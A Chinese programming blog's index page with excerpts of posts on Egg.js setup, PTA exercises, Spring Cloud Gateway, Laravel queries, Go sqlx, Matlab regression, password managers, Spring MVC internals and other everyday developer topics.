Express.js 是 Node.JS 诞生之初，最早出现的一款框架，现在仍然很流行，作者是TJ。随着ECMAScript的发展，推出了generator yield 语法，JS向同步方式写异步代码迈出了一步，作为回应，TJ大神推出了Koa.js。Koa.js是一款微型Web框架，写一个hello world很简单，但 web 应用离不开session，视图模板，路由，文件上传，日志管理。这些 Koa 都不提供，需要自行去官方的 Middleware 寻找。然而，100个人可能找出100种搭配。Egg.js是基于Koa.js，解决了上述问题，将社区最佳实践整合进了Koa.js，另取名叫Egg.js，并且将多进程启动，开发时的热更新等问题一并解决了。这对开发者很友好，开箱即用，开箱即是最(较)佳配置。Egg.js发展期间，ECMAScript又推出了 async await，相比yield的语法async写起来更直观。当然，Koa.js同步进行了跟进，Egg.js低层依赖Koa.js，自然也进行了跟进。现在TypeScript大热，可以在编码期间，提供类型检查，更智能的代码提示。Egg.js不支持TypeScript，此时淘宝团队在Egg.js基础上，引入了TypeScript支持，取名叫 MidwayJS 。 TypeScript是绕不开的话题。基于Express.js的全功能框架 Nest.js，他是在Express.js上封装的，充分利用了TypeScript的特性；Nest.js的优点是社区活跃，涨势喜人。缺点是，如果从来没有接触过TS，刚开始学习曲线有点陡峭。
简单来讲，egg.js对我们使用者来说，其实是封装了一套koa，可以理解成大礼包版的koa，集成度高，可以轻松创建一个项目而不用做很多繁琐的初期工作，解放生产力，更可贵的是有一套现成的规范提供给我们，不需要我们自己再去探索一套规范。
那我们，还在等什么呢？备好键盘，快来一起体验一下！
一、体验搭建过程（demo） 推荐直接使用脚手架，只需几条简单指令，即可快速生成项目（npm &gt;=6.1.0):
使用egg脚手架初始化 * $ mkdir eggDemo &amp;&amp; cd eggDemo * $ cnpm init egg --type=simple * $ cnpm i ps: npm下载插件网速较慢，还是cnpm的淘宝镜像好撸些~
下面是命令的执行过程~
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-WG2XaxzR-1603701814698)(/egg1.jpg)]
当与脚手架的连接建立成功时，首先需要手动补充项目的配置项：
project name（项目名称）project description （项目描述）project anthor (作者)cookie security keys (cookie标识 此项默认生成) [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Vvn59Sfy-1603701814699)(/egg2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9c739243bec8308c311c6728c514546/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0d913694d5df4112b51a08c1ce2f814/" rel="bookmark">
			PTA 列出叶结点 (25分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PTA 列出叶结点
题目描述：
对于给定的二叉树，本题要求你按从上到下、从左到右的顺序输出其所有叶节点。
输入格式：
首先第一行给出一个正整数 N（≤10），为树中结点总数。树中的结点从 0 到 N−1 编号。随后 N 行，每行给出一个对应结点左右孩子的编号。如果某个孩子不存在，则在对应位置给出 “-”。编号间以 1 个空格分隔。
输出格式：
在一行中按规定顺序输出叶节点的编号。编号间以 1 个空格分隔，行首尾不得有多余空格。
输入样例：
8 1 - - - 0 - 2 7 - - - - 5 - 4 6 样例输出
4 1 5 这道题目呢，其实也算是一种套路，首先题目中说了从上到下，从左到右，你就应该想到，这就是层序遍历的套路呀，如果我能够找到层序遍历的数组，那么这个问题就迎刃而解了。
首先我们要明确一点，按照题目中的输入，根节点是肯定不会出现在这里面的，所以我们只需要找到没有出现的数字，然后就可以确定根节点，有了根节点，然后再模拟队列的性质，依次把他的左孩子，右孩子插入进来，然后遍历指针+1，继续插入根节点的左孩子的左孩子和右孩子…
那么问题来了，我需要用什么样的数据结构来存储这些内容呢？首先我得有一个树结点，但是这个结点呢，他不需要数据域，只需要一个左孩子和一个右孩子就可以了
struct Node { int left; int right; } 为什么要这么写呢？因为我一会儿会创建一个Node数组，数组的下标就是数据域，因此只需要保存每个结点的左右孩子就行了。
然后呢，我会用到一个辅助数组checked用来确定哪一个数字没有出现过，那就是根节点。
有了根节点，下一步我需要一个队列ans，首先把根节点存进去，然后从根节点开始，左孩子，右孩子，左孩子的（左孩子，右孩子），右孩子的（左孩子，右孩子）…，最后，遍历ans数组，如果有一个的 left 和 right 都是-1，那么说明这个就是叶结点。
#include &lt;iostream&gt; #include &lt;cstdio&gt; using namespace std; struct Node { int data;	int left; int right; }; int main() { int n; cin &gt;&gt; n; getchar(); //千万千万注意这个getchar(),否则程序会直接崩溃 Node tree[15]; //因为这个数组的下标就是data，所以我不需要额外的data域 int checked[15] = {}; //检查根节点的 for(int i = 0;i &lt; n;i++) { char l,r;	scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0d913694d5df4112b51a08c1ce2f814/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa3a8b716106b4e27a59583f813e3170/" rel="bookmark">
			Spring Cloud 路由网关(Gateway:异步,WebFlux) nacos配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Zuul支持 参考 Sentinel 网关限流(同步并阻塞)
若想跟 Sentinel Starter 配合使用，需要加上 spring-cloud-alibaba-sentinel-gateway 依赖，同时需要添加 spring-cloud-starter-netflix-zuul 依赖来让 spring-cloud-alibaba-sentinel-gateway 模块里的 Zuul 自动化配置类生效：
&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-sentinel-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt; 什么是 Spring Cloud Gateway Spring Cloud Gateway 是 Spring 官方基于 Spring 5.0，Spring Boot 2.0 和 Project Reactor 等技术开发的网关，Spring Cloud Gateway 旨在为微服务架构提供一种简单而有效的统一的 API 路由管理方式。Spring Cloud Gateway 作为 Spring Cloud 生态系中的网关，目标是替代 Netflix ZUUL，其不仅提供统一的路由方式，并且基于 Filter 链的方式提供了网关基本的功能，例如：安全，监控/埋点，和限流等。
Spring Cloud Gateway 功能特征 基于 Spring Framework 5，Project Reactor 和 Spring Boot 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa3a8b716106b4e27a59583f813e3170/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53913f2e53eb91485dd82edf429c8c31/" rel="bookmark">
			Laravel 多条件 AND , OR条件组合查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近遇到了复杂的查询语句 , 趁此机会总结一下 , laravel 使用数组格式作为参数的查询条件
假设有个用户表
----------- -- user 用户表 ----------- CREATE TABLE user ( user_id mediumint(8) NOT NULL AUTO_INCREMENT COMMENT '用户ID', group_id mediumint(8) NOT NULL COMMENT '用户组ID', user_name varchar(32) NOT NULL COMMENT '用户名', user_pwd varchar(32) NOT NULL COMMENT '用户密码', user_phone int(12) NOT NULL COMMENT '用户手机号码', user_sex varchar(6) NOT NULL COMMENT '用户性别', user_qq mediumint(9) NOT NULL COMMENT '用户QQ号码', user_email varchar(64) NOT NULL COMMENT '用户EMAIL地址', user_address varchar(255) NOT NULL COMMENT '用户地址', user_mark mediumint(9) NOT NULL COMMENT '用户积分', user_rank_id tinyint(3) NOT NULL COMMENT '用户等级', user_last_login_ip varchar(15) NOT NULL COMMENT '用户上一次登录IP地址', user_birthday int(13) NOT NULL COMMENT '用户生日', user_description varchar(255) NOT NULL COMMENT '自我描述', user_image_url varchar(255) NOT NULL COMMENT '用户头像存储路径', user_school varchar(255) NOT NULL COMMENT '毕业学校', user_register_time int(13) NOT NULL COMMENT '用户注册时间', user_register_ip varchar(15) NOT NULL COMMENT '用户注册时IP地址', user_last_update_time int(13) NOT NULL COMMENT '用户上次更新博客时间', user_weibo varchar(255) NOT NULL COMMENT '用户微博', user_blood_type char(3) NOT NULL COMMENT '用户血型', user_says varchar(255) NOT NULL COMMENT '用户语录', user_lock tinyint(3) NOT NULL COMMENT '是否锁定，0为不锁定，1为锁定', user_freeze tinyint(3) NOT NULL COMMENT '是否冻结，0为不冻结，1为冻结', user_power varchar(255) NOT NULL COMMENT '拥有权限', PRIMARY KEY (user_id) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 ; 创建模型 , 然后依据各种条件查询数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53913f2e53eb91485dd82edf429c8c31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9d8fe5d3eee3c6d5f6c66571314d794/" rel="bookmark">
			mineMap地图编辑图形功能---多边形绘制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求：在已有显示地图上增加一个可编辑的动态面，圆形拖动圆形实现将圆形范围内的点位显示；初始化时需要默认一个范围面
…
效果预览
需求分解：类似的功能会有很多，单核心都只有一个就是可以编辑的动态的图形的绘制问题。
加载地图相关应用
/** * @Description: 初始化地图 * @Author: ShiWei * @Date: 2020-09-07 */ init(){ if (!this.mapController) { this.mapController = new MapController(this);} this.mapController.initMap("map-main"); this.map=this.mapController.getMap(); this.map.setCenter([106.699069493,26.5961406396]) this.map.setZoom(10) let _this=this; /* 地图加载完成 * 创建地图对象后,开始加载地图资源, 地图资源加载完成后触发load事件 * 如果地图数据加载并渲染完成后,调用.isStyleLoaded()会返回true, 否则返回false */ this.map.on("load", function() { var t = setInterval(function() { if (_this.map &amp;&amp; _this.map.isStyleLoaded()) { _this.addMapHandle(_this.map) // 绑定编辑操作记录新增事件 _this.map.on("edit.record.create", _this.onEditRecordCreate); //加入监听 _this.map.on("edit.selected", _this.onEditSelected); //初始化所有区域都加载 // _this.getAreaByType(1); // _this.handleSilder() clearInterval(t); _this.$message({ message: '地图数据加载完成', type: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9d8fe5d3eee3c6d5f6c66571314d794/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76dba8643b375195187394bccce6a825/" rel="bookmark">
			sqlx的使用及注意点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 sqlx是基于Go内置database/sql包上的扩展，主要是简化了sql的使用过程。sqlx的sql.DB, sql.TX, sql.Stmt等保持底层实现不变，因此可以很方便地从database/sql切换到sqlx。sqlx另外还提供了一些功能：
可以将Rows内容解析至struct（支持内嵌）、map、slice命名参数支持Get/Select可以快速将查询结果转为为struct/slice 使用 1. Open/Connect Open可能仅校验参数，而没有与db间创建连接，要确认db是否可用，需要调用Ping。Connect则相当于Open+Ping。
使用如下：
db, err := sqlx.Open("postgres", "user=foo dbname=bar sslmode=disable") if err != nil { log.Fatalln(err) } db, err := sqlx.Connect("mysql", "user:password@host:port?database") if err != nil { log.Fatalln(err) } 2. Queryx/QueryxContext/QueryRowx/QueryRowxContext 用于查询多条/单条数据
与database/sql的Query/QueryxContext/QueryRow/QueryRowContext区别在于返回的是*sqlx.Row
rows, err := db.Queryx("SELECT * FROM place") for rows.Next() { err := rows.StructScan(&amp;place) if err != nil { log.Fatalln(err) } fmt.Printf("%#v\n", place) } 3. Exec Exec执行sql语句而不返回rows，主要用于insert、update、delete
db.Exec("INSERT INTO person (first_name, last_name, email) VALUES ($1, $2, $3)"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76dba8643b375195187394bccce6a825/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2fd1e9598ffc970f58ae0523935bfb6/" rel="bookmark">
			Matlab实现随机森林、神经网络、Lasso回归
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现之前所说的上传Matlab实现随机森林、神经网络、Lasso回归的承诺。
Lasso lasso具有降维的功能，但区别于PCA，lasso直接减少特征数，做的是特征选择，PCA是通过空间转换将特征空间从高维空间转换到低维空间，是降维（PCA的缺点是丢失语意）。当特征有很强的语意的时候，用LASSO更好，后续的分析会更高的保持可解释性，可以给出y=wx表达式（y、w、x均为向量）；反之，数据的语意性不强，PCA更好。
%清空命令窗口 clc; %清空工作区的变量和值 clear; %关闭所有程序运行过程中打开的绘图窗口，此处为绘图窗口。 close all; %读取excel数据， x1=xlsread("C:\xxx.xlsx",'C4:J328'); y1=xlsread("C:\xxx.xlsx",'K4:K328'); %调用lasso函数，其中参数为（自变量x，因变量y，使用交叉验证，10折交叉验证，α，α=0为岭回归，α=1为lasso回归）；返回值为（b：权重系数，fitinfo:模型信息） [b,fitinfo] = lasso(x1,y1,'CV',10,'Alpha',1); %画图 axTrace = lassoPlot(b,fitinfo,'PlotType','Lambda','XScale','log'); %为图像添加图例，位置在图的右侧外面 legend('show','Location','EastOutside'); axCV = lassoPlot(b,fitinfo,'PlotType','CV'); %寻找最小误差对应的迭代次数 lam1SE = fitinfo.Index1SE; %最小误差的值 mse_1=fitinfo.MSE(lam1SE); %取最小误差对应的系数；b矩阵lam1SE列所有行 mat=b(:,lam1SE); %寻找系数中的非零项（~=0为不等于0） [row1SE, ] = find(b(:,lam1SE)~=0); %计算原来的最小均方误差 rhat = x1\y1; res = x1*rhat - y1; MSEmin_real= res'*res/325; %最小均方误差对应的迭代次数，上面误差是1se这里是mse lamMinMSE = fitinfo.IndexMinMSE; %主成分的系数 matMinMSE = b(:,lamMinMSE); %寻找非零自变量的下标（即主成分的下标） [rowMinMSE, ] = find(b(:,lamMinMSE)~=0); %两种计算误差方式使得所降成的维度不同，根据自己需求比较两个误差计算方式的差异选择留几个变量。 随机森林RF 随机森林可以计算对于最后的结果贡献率最高的特征，对于回归可以得出线性模型。
clc; clear; in=xlsread("C:\xxx.xlsx",'C4:J328'); Out=xlsread("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2fd1e9598ffc970f58ae0523935bfb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1947d1c981b81200572af427a18a33d9/" rel="bookmark">
			c&#43;&#43; lambda 使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 bool KafkaResourceManager::Register(std::string name, std::function&lt;std::shared_ptr&lt;rubik::KafkaResource&gt;()&gt; callback) { std::shared_ptr&lt;rubik::KafkaResource&gt; resource = callback(); if (resource) { return false; } kafka_resources_[name] = resource; return true; } bool Register(std::string name, std::function&lt;std::shared_ptr&lt;rubik::KafkaResource&gt;()&gt; callback); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a32ea4c09111fc3626962eb0c0a38df/" rel="bookmark">
			力扣刷题顺序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://leetcode-cn.com/circle/article/48kq9d/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8aabb856be2c1d0cb7dc529af9d94aa6/" rel="bookmark">
			苹果手机软件升级密码_密码太多总是忘？不如试试这7个密保工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文/心语 首发于一周进步
谈到用户的安全问题，最坚实也是最直接的后盾就是密码的设置。
随着网络攻击问题的频发，个人信息的泄露也是常有的事。一些软件所谓的安全保障可能远远不如一个密码更安全。密码有时候就会成为你个人信息的最后一道防线。
这些存在你脑海里的符号数字也是最重要的安全卫士。
01．设置最安全的密码
既然我们每天都要面对各种各样需要密码的场景，那我们就要养成良好的密码设置管理习惯。
①千万不要在不同的账户使用同一个密码
密码要保证不一致性，这样才能拥有高度的安全性。
当然一些无关紧要的账户可以使用相同的密码便于记忆。其他的重要的账户最好要改变密码。
②基本密码的设置方法是长度超过16位的数字，符号，字母的组合
不要设置简单的密码，哪怕是复杂的数字组合。这样的设置在暴力破解面前会显得无能为力。
③设定不同的密码制定规则
在面对不同的账户时可以根据账户类型等信息设置适合自己的密码规则。
把生日和个人信息当做密码有时候是很危险的行为，还是建议大家避开泄漏信息的盲点。
④对于不同类型的密码设定不同的密码强度
重要度不同的账户设定不同级别的密码。
普通的网络浏览账户和银行账户密码的强度当然不能一致，越是重要的密码要越有难度。这些规则都是我们应该学会的基本规则。
但是我们经常遇到记不住密码的情况，多次尝试后只能无奈地点击“找回密码”。这样尴尬的场景你一定很熟悉，而我们只需要一种工具就可以解决烦恼——密码管理工具。
02.什么是密码管理工具
为了适应互联网的发展脚步，密码管理工具慢慢地浮出水面。这是一种方便用户创建/管理/存储和整理密码的辅助工具。
密码管理工具的工作原理是帮助你生成一段复杂的可靠的绝对安全的密码，或者帮你存储你已经设置好的密码，然后将它们通过运算加密形式保护存储，防止破解等账户攻击发生。
你需要设置一个进入密码管理工具的密码并保证它足够安全，只需要记住这一个密码就可以解锁其他的密码了。
03.密码管理工具有什么好处
你可以自己生成需要的密码，然后存入密码管理器，下次在网页上使用时就会自动为你填充。
甚至可以为你设置安全度其强的密码，你不需要记住密码是什么依旧可以毫不费力地登录各种账户，极大地节省你记忆密码的脑力消耗。
更重要的这样的方式很好的对你的密码进行保护，不论是物理登录环境的改变还是恶意软件的攻击都不会造成损害。
密码管理工具甚至可以称为一个系统，就像一个全面管理你在线账户的私人保险柜，把各种密码统统交给它来管理。定期整理保险柜，在平时只需要放心使用即可。
04. 这些记忆大师你值得拥有：电脑软件篇
说了这么多，让我们来盘点一下有哪些密码管理工具值得你去尝试去体验。
LastPass 平台：Windows 电脑端免费，移动端收费
推荐度：★★★★★
这是一款windows平台好评率极高的密码管理器。
免费的软件加上操作的简单让很多人爱不释手。就像它的名字一样，只有最后一个管理器的密码需要你记住，其他的就交给LastPass来管理就好，再也不会遇到密码繁琐的登录问题聊。
更加全面的是LastPass拥有几乎所有浏览器平台的插件。
打开网页输入密码时就会提醒你是否要记住，如果你选择记住后那么下次进入时就会帮助你自动填充账户密码。
如果你烦恼于在新的网页设置新的密码，LastPass也可以帮你智能创建一个安全的密码。
在LastPass客户端还可以整理自己的密码并进行分类，便于自己的管理。
KeePass 平台：Windows/Mac os/linux 开源免费
推荐度：★★★★☆
小巧轻量又足够强大是KeePass的亮点。
你的用户名和密码都可以通过其安全的加密技术进行保护，还可以在不同的密码上进行分类和备注。
虽然没有LastPass在浏览器上自动填充的强劲表现， 但作为一款开源绿色的软件来说KeePass可以算是安全可靠的代表。简单高效又小巧一定会得到你的青睐。
Keeper 平台：全平台 收费，有试用期
推荐度：★★★☆☆
Keeper是一款更加偏向于企业级防护的密码管理器。
当然它的军事级加密防护方式对个人账户来说会更加安全。Keeper的安全性极高，会通过多种步骤验证你的身份信息。
Keeper还有一个功能，你可以选择在输入密码错误次数达到五次后删除设备的所有记录，这样可以有效的保护一些重要的网站和文件信息。
所有的信息记录你还可以在自己的云备份空间中查找到。
Keeper同样也提供浏览器插件方便你自动填充密码，还可以添加共享人共享文件。
现在Keeper还处于收费的状态，当然费用也不是很高，如果有高强度密码安全要求的小伙伴可以考虑。
Enpass 平台：全平台 电脑端免费，移动端20条密码免费
推荐度：★★★☆☆
简约类型的密码管理软件。
支持全平台的用户，也支持在浏览器添加插件使用，可以轻松地应付你每个密码使用场景。 Enpass还可以离线本地使用，在你有网络时自动同步到账户。
还可以设置修改密码时在一段时间内无操作则自动上锁，以此来保护你的隐私。
界面相对来说没有很多复杂功能，简单易上手。如果你不是一个密码使用的重度用户，那么移动端的20条密码免费资格对你来说也是足够的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8aabb856be2c1d0cb7dc529af9d94aa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e30fb5898ecbe2cfa80b63a1314af0bd/" rel="bookmark">
			springboot&#43;XMLHttpRequest文件下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端 html &lt;script type="text/html" id="currentTableBar"&gt; &lt;a class="layui-btn layui-btn-normal layui-btn-xs data-count-edit" lay-event="download"&gt;下载&lt;/a&gt; &lt;a class="layui-btn layui-btn-xs layui-btn-danger data-count-delete" lay-event="delete"&gt;删除&lt;/a&gt; &lt;/script&gt; JS var url = ""; var xhr = new XMLHttpRequest(); xhr.open('GET', '/management/download/?'+ $.param(data), true);//get请求，请求地址，是否异步 xhr.responseType = "blob"; // 返回类型blob xhr.onload = function () {// 请求完成处理函数 if (this.status === 200) { var blob = this.response;// 获取返回值 console.log(blob) var a = document.createElement('a'); a.download = data.fileName; a.href=window.URL.createObjectURL(blob); a.click(); } }; xhr.send(); controller 这里controller的传值 是从前端动态接收下载路径和文件名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e30fb5898ecbe2cfa80b63a1314af0bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5448cfd8813e018bf26654212633896/" rel="bookmark">
			Spring MVC 请求流程 - 执行handle
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阅读本文需要 10 分钟
tips：本文属于 Spring MVC 请求流程 - 基于源码解读 的小分支
拦截器 在执行 handler 的前后，都会先走一遍拦截器
查看 applyPreHandle，里面调用了 HandlerInterceptor 的 preHandler 方法
登陆验证拦截其实就是实现这个方法，如果 preHandle 返回 false ，那么 applyPreHandle 就会返回 false，直接 return，后面的 handle 也就无法执行了
执行Handle 当前适配器是 RequestMappingHandlerAdapter，调用的是父类 AbstractHandlerMethodAdapter 的 handle
进去，然后调用了 handleInternal，这个方法的实现类是 RequestMappingHandlerAdapter
进入 handleInternal，发现有个方法invokeHandlerMethod 出现了3次，该方法负责处理由@RequestMapping注解编写的 handler，并且返回模型和逻辑视图
invokeHandlerMethod 内部处理比较复杂，我们直接跳到最后
查看 ServletInvocableHandlerMethod 的 invokeAndHandle，里面还有一层InvocableHandlerMethod#invokeForRequest，里面的 doInvoke 就是真正处理请求的方法
查看 doInvoke，里面就是反射调动，也从另一个方面说明，为什么Handler要保存bean
最后再画个序列图理清执行 handle 的主干
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6170ddc34e036a9ca0f15922066249f3/" rel="bookmark">
			3D模型修补软件Magics的几个基本操作（设置中文、自定义工具页、缩放与拉伸）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要：做3D打印的，一般都会使用Magics软件。不做3D打印的，也有必要了解一下Magics软件，以后会用到的。本文简单介绍一下Magics软件是什么、怎么样设置成中文、工具页丢了怎么找回来，以及常用的缩放与拉伸操作。
目录
1.Magics是什么？
2.设置Magics为汉语
3.自定义工具栏
4.Magics缩放零件
5.Magics拉伸操作
1.Magics是什么？ Magics是Materialise公司针对快速成型开发的一款处理STL数据的软件，易学易用，强大的布尔功能深受用户喜欢。
没错，可以处理STL数据。对于大多数人来说，STL是原作者设计完成作品之后，导出的不可修改的文件。STL文件的特点是所有的曲面都是用一个个三角形来代表的。
没有Magics之前，如果你想在STL模型上做出修改，那简直是不可能的是。现在，可以了。你可以添加、删除、切断、拉伸等，修改之后的文件，仍然可以用来3D打印。
2.设置Magics为汉语 默认安装完毕之后，Magics界面是英文的
接下来找到设置按钮，外观是一个齿轮。
选择General，然后更改语言，这样就可以了。
设置为chinese
接下来提示这个Magics会重启。
瞧，界面就成了中文了，操作起来会更加方便一些，不用刻意地想哪个功能在哪里了。
3.自定义工具栏 在这里写自定义工具栏，并不是因为这个操作有多复杂，主要是解决误操作把某个工具栏关掉之后找不到的问题。
我在使用的时候，一不小心把零件列表给关掉了，怎么样也找不到，耽误事啊！
如下图所示，最右侧的就是工具页。我将零件切割成2块。
不小心把零件列表页弄丢了，直接影响零件的导出。
解决方法是设置选项
在自定义界面里面的工具页中重新勾选上“零件列表”，问题就解决了。
重新出现
4.Magics缩放零件 首先打开模型。
按下图选择缩放
缩放系数非常简单，直接输入即可
比如2倍
尺寸真的成了2倍
5.Magics拉伸操作 使用“标记平面”功能标记所选零件的平面，标记完成之后，就显示绿色。
按照下图所示，选择拉伸
输入拉伸的距离，这个就拉成一个平台了。
小结：Magics功能非常强大，以上只是几个入门的基本功能，不过都很重要，希望能够帮助到需要的同学。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b11493e78ffc4db922e2f364e4948bf/" rel="bookmark">
			总结一个非常有用的框架学习方法（非常有效！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、编写Readme.md二、科学编写注释第一步：在注释中编写需求(应用场景)第二步：在注释中编写关联文件第三步：在注释中编写解决方案 总结 前言 学习框架以来，虽然代码量，耦合度大大减少，但是框架都有轻代码，重配置的特点，导致各种配置纷繁复杂，就算使用了注解开发，前后端互相传递数据，接收参数，也容易让初学者搞混。
如果你是看网上的视频自学，跟着视频写Demo，调用关系更是让人头大，很多种情况都是为了完成一个业务，传参，调用关系动不动就涉及到好几个文件，注释都不知道从哪开始写。所以笔者总结了一套比较有用的注释方法，能比较高效的注释Demo中的代码，理清业务之间的关系。而且隔较久时间，日后回看仍然能够清晰明了。
本文是学习方法总结，不涉及任何技术和代码讨论。但是不管是什么语言，什么技术都可以通过这种方法加代码注释，屡试不爽。
一、编写Readme.md 在每一个模块里面至少新建一个Readme.md文件（文件名可以自己起，叫dog.md都行），到模块的根目录。这个Readme.md可以总结一下这个Demo/项目到底是干什么的，用到的知识点，技术点是什么。
日后如果回看代码，先去找这个Readme.md, 就大概知道这个模块究竟干了什么事情了。非常方便。
下面举个例子，看我在Readme.md里面究竟写了啥：
这个Demo是我好几个月前写的了，但是今天打开Readme.md一看，感觉一目了然，很快的回忆起来了相关的知识点。
二、科学编写注释 前文中说过，写复杂Demo的注释是一件让人头大的事情，很多种情况都是为了完成一个业务，传参，调用关系动不动就涉及到好几个文件，注释都不知道从哪开始写。
经过多次总结，优化，笔者发现了一种方法。
经过分析可知，绝大多数的业务代码都可以被拆分成三部分，分别是：
需求(应用场景)关联文件(为解决这一个业务需求，需要调用的文件们)解决方案 分析完毕，下面逐条介绍究竟该怎么做
第一步：在注释中编写需求(应用场景) 需求（应用场景）的意思是： 为什么要写这些代码啊？折腾来折腾去是为了什么？这个技术应用的是哪些场景？ 那么我们开始写注释，也就可以从这里写起了。先用一两句话，言简意赅地说明需求。
第二步：在注释中编写关联文件 举个例子：
现在我们要完成一个业务，需求是：在侧边栏中, 谁被选中,谁就高亮。
要完成这件事，需要动以下这么几个文件的代码： a.html, b.html , c.java , d.properties
好，那么上述几个文件就是该需求的关联。但是我们还需要找一个地方，写下来这么个关联关系。这个地方可以是上文说的Readme.md。于是我们就可以在Readme.md中这样写 :
需求(应用场景) : 在侧边栏中, 谁被选中,谁就高亮.
关联文件 : a.html , b.html , c.java , d.properties
在以上四个文件中，Ctrl+F 搜索主键：高亮侧边栏。
上面提到了主键，这里我借用了数据库的主键概念做类比。如果你的a.html , b.html , c.java , d.properties 这四个文件有成百上千行，你想迅速在这4个关联文件中找到和该需求相关的地方，效率是非常低下的。所以我就定义了这么一个主键的概念，方便快速在关联文件中搜索与该业务相关的代码。
主键最好定义成言简意赅的短语，或者英语单词。将主键放在关联文件中与该业务相关的代码附近，如果你想找到它，那就Ctrl+F，搜索主键，就能快速定位。
刚才这个例子的主键，我就叫中文：高亮侧边栏。只要能快速搜索到就行
第三步：在注释中编写解决方案 第三步是最简单的，也是大家都会做的。无非就是写注释或者伪代码，这个地方怎么做？怎么实现？这个代码什么意思？
解决方案部分，可以写在Readme.md里，也可以注释在各个关联文件的主键下面。建议写在各个关联文件中。就和平时在代码上面加注释一样，比较方便，没有特殊要求。在相关文件中搜索主键立刻就能看到旁边的注释，非常方便。
总结 我自己用了该方法加注释，学习，分析完调用关系之后，感觉思路清晰了不少，也能减轻看陈年代码看不懂的问题。大家都知道，将来找工作写业务代码的时候，Demo到用时方知少的道理。但是你如果连你平日自己写的Demo注释都看不懂，那不就凉凉了。
学习方法的总结，不止这一篇。我是一个文科生，自学编程以来，不停的踩坑，记录，总结，现在觉得高中时学的哲学还是有效的。运用科学的方法论可以帮我们理清思路，提高学习工作效率。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1f775ba2c28e60c78d14f714ec93320/" rel="bookmark">
			PTA基础编程题目集１－６题答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		6-1 简单输出整数 (10分) 本题要求实现一个函数，对给定的正整数N，打印从1到N的全部正整数。
void PrintN (int N) { int i; for(i=1;i&lt;=N;i++) printf("%d\n",i); } 6-2 多项式求值 (15分) 本题要求实现一个函数，计算阶数为n，系数为a[0] … a[n]的多项式f(x)=∑​i=0​n​​(a[i]×x​i​​) 在x点的值。
函数接口定义： double f( int n, double a[], double x );
其中n是多项式的阶数，a[]中存储系数，x是给定点。函数须返回多项式f(x)的值。
